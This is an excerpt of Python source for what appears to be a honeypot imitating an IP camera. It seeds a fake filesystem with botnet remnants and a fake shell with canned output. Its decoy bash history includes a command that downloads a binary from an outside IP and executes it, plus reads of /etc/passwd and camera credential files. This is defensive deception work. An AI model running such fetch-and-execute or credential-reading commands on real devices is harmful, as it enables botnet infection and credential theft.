...
_FS_TEMPLATE = {
    ...
    # /tmp pre-seeded with traces of previous attackers (arch-specific botnet binaries + remnants)
    "/tmp":       [".sora", "mozi.m", "kworker", ".X11-unix",
                   "arm", "arm7", "mips", "mpsl", "x86_64", "i686",
                   ".dropper", ".update", "bot.sh"],
    "/var":       ["log", "run", "tmp", "www"],
...
_FILE_CONTENTS = {
    ...
    "/home/admin/.bash_history": (
        "ls /\ncat /etc/passwd\nifconfig\nuname -a\n"
        "cd /tmp && ls -la\n"
        "wget http://45.33.32.156/arm7 -O /tmp/arm7\n"
        "chmod 777 /tmp/arm7 && /tmp/arm7\n"
        "cat /mnt/mtd/Config/account.ini\n"
        "cat /etc/hikvision.conf\n"
        "crontab -l\nps\nnetstat -an\n"
    ...
    "/etc/crontab": (
        ...
        "*/5  *  *   *   *    root  /usr/bin/ipcam -c /etc/dvr.conf >/dev/null 2>&1\n"
        "0    2  *   *   *    root  /sbin/mtd_repair >/dev/null 2>&1\n"
        "*/30 *  *   *   *    root  /tmp/.update >/dev/null 2>&1\n"
    ),
...
class FakeShell:
    ...
    def _cmd_cat(self, args):
        ...
        if "crontab" in path.lower():
            return _FILE_CONTENTS["/etc/crontab"]
        if "network.ini" in path.lower():
    ...
    def _cmd_crontab(self, args):
        if "-e" in args:
            return ""  # silently pretend to open editor
        # -l or no args — show crontab
        return (
            "# DO NOT EDIT THIS FILE - edit the master and reinstall.\n"
            "# (/tmp/crontab.X4fK8z installed on Mon Jan  6 04:23:01 2025)\n"
    ...
    def _cmd_netstat(self, args):
        return (
            ...
            "udp        0      0 0.0.0.0:1883            0.0.0.0:*                      \n"
            f"tcp        0      0 {dev.HIK['lan_ip']}:23    {self.ip}:54321      ESTABLISHED\n"
            f"tcp        0      0 {dev.HIK['lan_ip']}:80    {self.ip}:49812      ESTABLISHED\n"
        )
